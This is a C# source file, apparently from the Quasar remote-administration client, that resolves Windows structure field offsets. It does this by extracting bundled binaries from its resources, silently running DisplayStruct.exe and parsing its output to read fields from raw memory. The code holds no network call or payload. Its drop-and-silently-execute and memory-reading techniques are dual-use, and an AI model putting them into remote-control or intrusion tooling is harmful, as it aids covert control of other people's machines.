using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Win32PE.Structs
{
    public class DbgOffset
    {
        static readonly Dictionary<string, DbgOffset> _cache = new Dictionary<string, DbgOffset>();

        readonly Dictionary<string, StructFieldInfo> _fieldDict = new Dictionary<string, StructFieldInfo>();

        public static DbgOffset Get(string typeName)
        {
            return Get(typeName, "ntdll.dll");
        }

        public static DbgOffset Get(string typeName, string moduleName)
        {
            return Get(typeName, moduleName, 0);
        }

        public static DbgOffset Get(string typeName, string moduleName, int pid)
        {
            return Get(typeName, moduleName, pid == 0 ? null : pid.ToString());
        }

        public static DbgOffset Get(string typeName, string moduleName, string targetExePath)
        {
            if (_cache.ContainsKey(typeName) == true)
                return _cache[typeName];

            var list = GetList(typeName, moduleName, targetExePath);
            if (list == null)
                return null;

            var instance = new DbgOffset(list);
            _cache.Add(typeName, instance);

            return _cache[typeName];
        }

        private DbgOffset(List<StructFieldInfo> list)
        {
            _fieldDict = ListToDict(list);
        }

        public IEnumerable<string> Keys
        {
            get
            {
                return _fieldDict.Keys;
            }
        }

        public IntPtr GetPointer(IntPtr baseAddress, string fieldName)
        {
            if (_fieldDict.ContainsKey(fieldName) == false)
                return IntPtr.Zero;

            return baseAddress + _fieldDict[fieldName].Offset;
        }

        public unsafe bool TryRead<T>(IntPtr baseAddress, string fieldName, out T value) where T : struct
        {
            value = default;

            if (_fieldDict.ContainsKey(fieldName) == false)
                return false;

            var address = baseAddress + _fieldDict[fieldName].Offset;
            value = (T)Marshal.PtrToStructure(address, typeof(T));

            return true;
        }

        public int this[string fieldName]
        {
            get
            {
                if (_fieldDict.ContainsKey(fieldName) == false)
                    return -1;

                return _fieldDict[fieldName].Offset;
            }
        }

        private static Dictionary<string, StructFieldInfo> ListToDict(List<StructFieldInfo> list)
        {
            var dict = new Dictionary<string, StructFieldInfo>();

            foreach (var item in list)
            {
                dict.Add(item.Name, item);
            }

            return dict;
        }

        private static List<StructFieldInfo> GetList(string typeName, string moduleName, string pidOrPath)
        {
            UnpackDisplayStructApp();

            var psi = new ProcessStartInfo()
            {
                FileName = "DisplayStruct.exe",
                UseShellExecute = false,
                WorkingDirectory = Path.GetDirectoryName(typeof(DbgOffset).Assembly.Location),
                Arguments = $"{typeName} {moduleName}" + (string.IsNullOrEmpty(pidOrPath) == true ? "" : $" \"{pidOrPath}\""),
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                LoadUserProfile = false,
            };

            var child = Process.Start(psi);
            var text = child.StandardOutput.ReadToEnd();

            child.WaitForExit();

            return ParseOffset(text);
        }

        private static List<StructFieldInfo> ParseOffset(string text)
        {
            var list = new List<StructFieldInfo>();
            var sr = new StringReader(text);

            while (true)
            {
                var line = sr.ReadLine();
                if (line == null)
                    break;

                var offset = ReadOffset(line, out var offsetEndPos);
                if (offsetEndPos == -1 || offset == -1)
                    continue;

                var name = ReadFieldName(line, offsetEndPos, out var nameEndPos);
                if (string.IsNullOrEmpty(name) == true || nameEndPos == -1)
                    continue;

                var type = line.Substring(nameEndPos).Trim();

                var sfi = new StructFieldInfo(offset, name, type);
                list.Add(sfi);
            }

            return list;
        }

        private static string ReadFieldName(string line, int offsetEndPos, out int nameEndPos)
        {
            nameEndPos = line.IndexOf(":", offsetEndPos);
            if (nameEndPos == -1)
                return null;

            var result = line.Substring(offsetEndPos, nameEndPos - offsetEndPos).Trim();
            nameEndPos += 1;

            return result;
        }

        private static int ReadOffset(string line, out int pos)
        {
            pos = -1;

            var offsetMark = "+0x";
            var offSetStartPos = line.IndexOf(offsetMark);
            if (offSetStartPos == -1)
                return -1;

            var offsetEndPos = line.IndexOf(" ", offSetStartPos);
            if (offsetEndPos == -1)
                return -1;

            offSetStartPos += offsetMark.Length;
            var offset = line.Substring(offSetStartPos, offsetEndPos - offSetStartPos);
            pos = offsetEndPos + 1;

            try
            {
                return int.Parse(offset, System.Globalization.NumberStyles.HexNumber);
            }
            catch
            {
                return -1;
            }
        }

        private static void UnpackDisplayStructApp()
        {
            UnpackDisplayStructAppFromRes("SimpleDebugger.dll");
            UnpackDisplayStructAppFromRes("WindowsPE.dll");
            UnpackDisplayStructAppFromRes("DisplayStruct.exe");
        }

        private static void UnpackDisplayStructAppFromRes(string fileName)
        {
            if (File.Exists(fileName) == true)
                return;

            var dirPath = Path.GetDirectoryName(typeof(DbgOffset).Assembly.Location);
            var filePath = Path.Combine(dirPath, fileName);

            var type = typeof(StructFieldInfo);

            using (var manifestResourceStream =
                type.Assembly.GetManifestResourceStream($@"{type.Namespace}.files.{fileName}"))
            {
                using (var br = new BinaryReader(manifestResourceStream))
                {
                    var buf = new byte[br.BaseStream.Length];
                    br.Read(buf, 0, buf.Length);
                    File.WriteAllBytes(filePath, buf);
                }
            }
        }
    }
}